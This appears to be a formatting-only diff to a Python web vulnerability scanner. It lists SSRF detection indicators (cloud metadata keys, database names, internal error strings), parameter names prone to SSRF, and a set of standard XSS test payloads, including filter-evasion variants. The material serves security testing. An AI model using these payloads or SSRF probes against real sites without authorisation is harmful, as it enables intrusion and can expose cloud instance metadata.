-    "SSH-2.0-", "220 ", "HTTP/1.1 ", "HTTP/1.0 ", "Server: ", "Content-Type: ",
-    
+    "SSH-2.0-",
+    "220 ",
+    "HTTP/1.1 ",
+    "HTTP/1.0 ",
+    "Server: ",
+    "Content-Type: ",
     # Cloud metadata indicators
-    "ami-", "instance-id", "instance-type", "local-hostname", "public-hostname",
-    "security-groups", "availability-zone", "placement", "network", "instance-identity",
-    
+    "ami-",
+    "instance-id",
+    "instance-type",
+    "local-hostname",
+    "public-hostname",
+    "security-groups",
+    "availability-zone",
+    "placement",
+    "network",
+    "instance-identity",
     # Database indicators
-    "mysql", "postgresql", "redis", "mongodb", "memcached", "elasticsearch",
-    
+    "mysql",
+    "postgresql",
+    "redis",
+    "mongodb",
+    "memcached",
+    "elasticsearch",
     # Error messages that indicate successful internal access
-    "Connection refused", "Connection timeout", "Internal Server Error", "504 Gateway Timeout",
-    "502 Bad Gateway", "Network is unreachable", "No route to host",
+    "Connection refused",
+    "Connection timeout",
+    "Internal Server Error",
+    "504 Gateway Timeout",
+    "502 Bad Gateway",
+    "Network is unreachable",
+    "No route to host",
 ]
 
 ssrf_vulnerable_params = [
-    'url', 'uri', 'path', 'continue', 'window', 'next', 'data',
-    'reference', 'site', 'html', 'val', 'validate', 'domain',
-    'callback', 'return', 'page', 'feed', 'host', 'port',
-    'to', 'out', 'view', 'dir', 'show', 'navigation', 'open',
-    'file', 'document', 'folder', 'ping', 'lookup', 'proxy',
-    'redirect', 'target', 'link', 'goto', 'endpoint', 'api',
-    'webhook', 'fetch', 'load', 'download', 'upload', 'import',
-    'export', 'backup', 'restore', 'sync', 'connect', 'check'
+    "url",
+    "uri",
+    "path",
+    "continue",
+    "window",
+    "next",
+    "data",
+    "reference",
+    "site",
+    "html",
+    "val",
+    "validate",
+    "domain",
+    "callback",
+    "return",
+    "page",
+    "feed",
+    "host",
+    "port",
+    "to",
+    "out",
+    "view",
+    "dir",
+    "show",
+    "navigation",
+    "open",
+    "file",
+    "document",
+    "folder",
+    "ping",
+    "lookup",
+    "proxy",
+    "redirect",
+    "target",
+    "link",
+    "goto",
+    "endpoint",
+    "api",
+    "webhook",
+    "fetch",
+    "load",
+    "download",
+    "upload",
+    "import",
+    "export",
+    "backup",
+    "restore",
+    "sync",
+    "connect",
+    "check",
 ]
 
-### XSS PAYLOADS
+# == XSS PAYLOADS
 xss_payloads = [
-    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<body onload=alert('XSS')>",
-    "<svg onload=alert('XSS')>", "<iframe src=\"javascript:alert('XSS')\"></iframe>",
-    "\"><script>alert('XSS')</script>", "';alert('XSS');//", "\"><img src=x onerror=alert('XSS')>",
-    "<scr<script>ipt>alert('XSS')</script>", "'>\"><script>alert('XSS')</script>",
-    "'\"</script><script>alert('XSS')</script>", "\";alert('XSS');//",
-    "' onclick='alert(\"XSS\")' '", "javascript:alert('XSS')"
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "<svg onload=alert('XSS')>",
+    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+    "\"><script>alert('XSS')</script>",
+    "';alert('XSS');//",
+    "\"><img src=x onerror=alert('XSS')>",
+    "<scr<script>ipt>alert('XSS')</script>",
+    "'>\"><script>alert('XSS')</script>",
+    "'\"</script><script>alert('XSS')</script>",
+    "\";alert('XSS');//",
+    "' onclick='alert(\"XSS\")' '",
+    "javascript:alert('XSS')",
 ]
